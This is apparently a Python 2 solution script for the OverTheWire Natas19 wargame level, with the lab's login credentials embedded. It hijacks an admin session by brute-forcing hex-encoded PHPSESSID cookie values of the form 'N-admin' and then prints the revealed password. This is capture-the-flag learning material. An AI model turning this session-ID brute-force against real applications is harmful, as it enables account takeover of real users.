# Natas19 python solution
# By Emil 'Dota' Bak, 2019

import requests

# ***********************************************
URL = "http://natas19.natas.labs.overthewire.org/"

auth_name = 'natas19'
auth_pass = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'

s      = requests.Session()
s.auth = (auth_name,auth_pass)
# ***********************************************

# This challenge is nearly identical to 'natas18', however,
# the Cookie the user receieves has been turned to hex.
# Simply use .decode('hex') to retrieve the actual Cookie information,
# and submit new Cookies until the correct admin ID has been found.

DATA = dict(username="admin",password="42")
r    = s.post(URL,data=DATA)

received_cookie = r.cookies.get_dict()["PHPSESSID"]

# It can be noticed that the Cookie is simply ascii turned hex
# print received_cookie.decode("hex")  # "xxx-admin"

for x in range(0,640):
    COOKIES = dict(PHPSESSID=(str(x) + "-admin").encode("hex"))
    r = s.post(URL, cookies=COOKIES)

    if not 'You are logged in as a regular user' in r.text:
        # print "The correct session_id for admin is (in ascii):",COOKIES["PHPSESSID"].decode("hex")
        for x in r.iter_lines():
            if "Password" in x:
                print x[0:42]
        break